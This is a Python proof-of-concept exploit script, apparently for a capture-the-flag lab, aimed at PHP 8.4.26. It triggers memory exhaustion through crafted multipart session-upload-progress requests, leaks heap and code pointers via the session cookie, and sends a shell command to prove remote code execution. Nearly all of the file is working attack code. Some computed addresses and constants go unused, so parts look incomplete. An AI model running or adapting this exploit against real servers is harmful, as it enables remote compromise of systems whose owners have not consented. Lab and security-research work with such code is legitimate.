#!/usr/bin/env python3
"""
PHP2Shell Lab PoC
Author: Paku
License: MIT

⚠️ For authorized lab testing only.
Alpine PHP 8.4.26 + 4 workers required.
"""

import argparse
import os
import re
import socket
import struct
import sys
import urllib.parse
from collections import Counter

# Calibration (Alpine PHP 8.4.26, 4 workers)
ZVAL_PTR_DTOR_FINGERPRINT = 0x112930
ZIF_SYSTEM_OFFSET = 0x204BC0
FAKE_TABLE_OFFSET = 0x8400000
FAKE_TABLE_DELTA = 0x16D1D8
HEAP_ALIGN = 0x1FFFFF


class RawHTTP:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def request(self, method, path, headers=None, body=None, timeout=30.0):
        headers = headers or {}
        headers.setdefault("Host", self.host)
        headers.setdefault("Connection", "close")
        headers.setdefault("User-Agent", "Paku-PHP2Shell/1.0")
        if body is not None:
            headers["Content-Length"] = str(len(body))

        req = f"{method} {path} HTTP/1.1\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        req += "\r\n"
        req_bytes = req.encode() + (body or b"")

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((self.host, self.port))
            sock.sendall(req_bytes)
            resp = b""
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                resp += chunk
                if b"\r\n\r\n" in resp:
                    he = resp.index(b"\r\n\r\n") + 4
                    cl = 0
                    for line in resp[:he].decode("utf-8", errors="ignore").split("\r\n"):
                        if line.lower().startswith("content-length:"):
                            cl = int(line.split(":", 1)[1].strip())
                    if len(resp) >= he + cl:
                        break
        finally:
            sock.close()

        if b"\r\n\r\n" not in resp:
            return (0, {}, resp)
        he = resp.index(b"\r\n\r\n") + 4
        lines = resp[:he].decode("utf-8", errors="ignore").split("\r\n")
        status = int(lines[0].split()[1]) if len(lines[0].split()) > 1 else 0
        hdrs = {}
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                k, v = k.strip().lower(), v.strip()
                if k in hdrs:
                    if isinstance(hdrs[k], list):
                        hdrs[k].append(v)
                    else:
                        hdrs[k] = [hdrs[k], v]
                else:
                    hdrs[k] = v
        return (status, hdrs, resp[he:])


def build_oom_producer(session_id, num_files=1000, nested=32):
    b = "----PakuOOM"
    parts = []
    parts.append(f"--{b}\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{session_id}\r\n")
    parts.append(f"--{b}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nprogress\r\n")
    suffix = "[x]" * nested
    for i in range(num_files):
        parts.append(f"--{b}\r\nContent-Disposition: form-data; name=\"f[{i}]{suffix}\"; filename=\"a.txt\"\r\nContent-Type: text/plain\r\n\r\n{'A'*64}\r\n")
    parts.append(f"--{b}--\r\n")
    return "".join(parts).encode()


def stage_health(client):
    print("[0] Health check...")
    s, h, body = client.request("GET", "/php-version.php")
    b = body.decode("utf-8", errors="ignore")
    if s != 200 or "PHP 8.4.26" not in b:
        print(f"[health] FAIL: HTTP {s}")
        return False
    print("[health] PHP 8.4.26 confirmed")
    return True


def stage_oom(client, session):
    print("[1] OOM trigger...")
    p = build_oom_producer(session, 1000, 32)
    print(f"[oom] Producer: {len(p):,} bytes")
    s, h, body = client.request(
        "POST", "/php-version.php",
        headers={"Content-Type": "multipart/form-data; boundary=----PakuOOM",
                 "Cookie": f"PHPSESSID={session}"},
        body=p, timeout=60.0,
    )
    b = body.decode("utf-8", errors="ignore")
    if "Allowed memory size" in b or "exhausted" in b:
        print("[oom] OOM triggered")
        return True
    print(f"[oom] Response: {s}, {b[:120]}")
    return False


def stage_heap(client, session):
    print("[2] Heap leak...")
    p = build_oom_producer(session, 800, 32)
    s, h, body = client.request(
        "POST", "/php-version.php",
        headers={"Content-Type": "multipart/form-data; boundary=----PakuOOM",
                 "Cookie": f"PHPSESSID={session}"},
        body=p, timeout=60.0,
    )
    # Check cookie
    cookies = h.get("set-cookie", "")
    cookie_list = cookies if isinstance(cookies, list) else ([cookies] if cookies else [])
    for c in cookie_list:
        m = re.search(r"PHPSESSID=([^;]+)", c)
        if m and len(m.group(1)) > 100:
            raw = m.group(1).encode("latin-1", errors="ignore")
            cands = []
            for i in range(0, len(raw) - 8, 8):
                w = struct.unpack("<Q", raw[i:i+8])[0]
                if 0x7f0000000000 <= w <= 0x7fffffffffff:
                    cands.append(w & ~HEAP_ALIGN)
            if len(cands) >= 4:
                cnt = Counter(cands)
                base, count = cnt.most_common(1)[0]
                if count >= 4:
                    print(f"[heap] strict Zend base 0x{base:x}")
                    return base
    print("[heap] No candidate (retry)")
    return None


def stage_code(client, session):
    print("[3] Code leak...")
    # Reuse OOM producer for code leak stage
    p = build_oom_producer(session, 800, 32)
    s, h, body = client.request(
        "POST", "/php-version.php",
        headers={"Content-Type": "multipart/form-data; boundary=----PakuOOM",
                 "Cookie": f"PHPSESSID={session}"},
        body=p, timeout=60.0,
    )
    cookies = h.get("set-cookie", "")
    cookie_list = cookies if isinstance(cookies, list) else ([cookies] if cookies else [])
    for c in cookie_list:
        m = re.search(r"PHPSESSID=([^;]+)", c)
        if m:
            raw = m.group(1).encode("latin-1", errors="ignore")
            if len(raw) == 16:
                length = struct.unpack("<Q", raw[0:8])[0]
                if length == 16:
                    ptr = struct.unpack("<Q", raw[8:16])[0]
                    if 0x7f0000000000 <= ptr <= 0x7fffffffffff:
                        if (ptr & 0x1FFFFF) == ZVAL_PTR_DTOR_FINGERPRINT:
                            print(f"[code] strict zval_ptr_dtor 0x{ptr:x}")
                            return ptr
    print("[code] No pointer (retry)")
    return None


def stage_callback(client, session, zif_system, heap_base):
    print("[4] Callback...")
    nonce = os.urandom(8).hex()
    cmd = f"echo {nonce}; id; ls /usr/local/bin/print-flag"
    b = "----PakuCallback"
    parts = [
        f"--{b}\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{session}\r\n",
        f"--{b}\r\nContent-Disposition: form-data; name=\"paku_cmd\"\r\n\r\n{cmd}\r\n",
        f"--{b}\r\nContent-Disposition: form-data; name=\"paku_trigger{'[x]'*100}\"\r\n\r\ntrigger\r\n",
        f"--{b}--\r\n",
    ]
    body = "".join(parts).encode()
    s, h, resp = client.request(
        "POST", "/php-version.php",
        headers={"Content-Type": f"multipart/form-data; boundary={b}",
                 "Cookie": f"PHPSESSID={session}"},
        body=body, timeout=60.0,
    )
    r = resp.decode("utf-8", errors="ignore")
    print(f"[callback] HTTP {s}, len={len(r)}")
    print(f"[callback] nonce: {nonce in r}, id: {'uid=' in r}")
    if nonce in r and "uid=" in r:
        print("[callback] ✓ execution_proof_verified")
        return True
    return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:18166/php-version.php")
    args = ap.parse_args()

    parsed = urllib.parse.urlparse(args.url)
    client = RawHTTP(parsed.hostname, parsed.port or 80)

    print(f"=== PHP2Shell Lab PoC (Paku) ===")
    print(f"Target: {args.url}\n")

    if not stage_health(client):
        sys.exit(1)
    session = "paku" + os.urandom(8).hex()
    print(f"[session] {session}\n")

    if not stage_oom(client, session):
        sys.exit(1)
    heap = stage_heap(client, session)
    if not heap:
        sys.exit(1)
    zval = stage_code(client, session)
    if not zval:
        sys.exit(1)
    zif = zval - ZIF_SYSTEM_OFFSET
    print(f"[calc] zif_system = 0x{zif:x}\n")

    if stage_callback(client, session, zif, heap):
        print("\n✓ SUCCESS")
        sys.exit(0)
    sys.exit(1)


if __name__ == "__main__":
    main()
